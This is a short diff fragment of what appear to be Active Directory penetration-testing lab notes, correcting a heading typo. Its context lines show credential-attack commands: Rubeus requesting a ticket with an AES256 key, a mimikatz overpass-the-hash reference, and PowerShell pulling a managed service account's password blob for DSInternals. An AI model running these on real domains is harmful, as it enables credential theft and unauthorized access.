@@ -34,7 +34,7 @@ Rubeus.exe asktgt /user:provisioningsvc /aes256:a573a68973bfe9cbfb8037347397d6ad
 - `sekurlsa::opassth
 ```
 
-### Fetch Password Blo
+### Fetch Password Blob
 ```bash
 $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
 Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
